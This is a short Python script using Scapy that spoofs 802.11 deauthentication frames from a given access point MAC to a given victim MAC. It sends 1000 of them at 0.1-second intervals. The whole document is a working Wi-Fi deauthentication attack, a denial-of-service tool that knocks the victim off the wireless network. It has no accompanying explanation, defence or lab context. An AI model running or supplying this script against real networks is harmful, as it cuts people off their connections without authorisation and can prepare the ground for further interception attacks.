from scapy.all import *

import sys

interface = 'prism0'

BSSID = raw_input("enter MAC of Ap: ")

vicmac = raw_input("enter victim of MAC: ")

frame= RadioTap()/ Dot11(addr1=vicmac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
sendp(frame,iface=interface, count= 1000, inter= .1)

